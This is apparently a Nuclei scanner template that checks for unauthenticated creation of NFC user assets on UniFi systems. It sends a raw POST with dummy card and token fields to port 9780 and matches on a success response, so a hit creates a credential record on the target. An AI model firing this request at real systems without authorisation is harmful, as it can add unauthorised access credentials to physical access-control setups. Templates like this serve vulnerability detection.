id: UniFi-nfc-UnauthenticatedCreate

info:
  name: UniFi-nfc-UnauthenticatedCreate
  author: iSee857
  severity: high
  description: |
    UniFi-nfc-UnauthenticatedCreate

variables:
  rand_num: '{{to_lower(rand_text_alpha(6))}}'

http:
  - raw:
      - |
        @Host: {{Hostname}}:9780
        POST /api/v1/user_assets/nfc HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

        {
          "alias": "{{rand_num}}",
          "asset_id": "1",
          "need_provision": true,
          "nfc_id": "1",
          "plain_token": "1",
          "sys_id": "1",
          "token": "1",
          "ua_card_id": "1",
          "ua_card_pub_key": "1"
        }

    matchers:
      - type: dsl
        dsl:
          - 'contains(body,"CODE_SUCCESS")'
          - 'status_code == 200'
        condition: and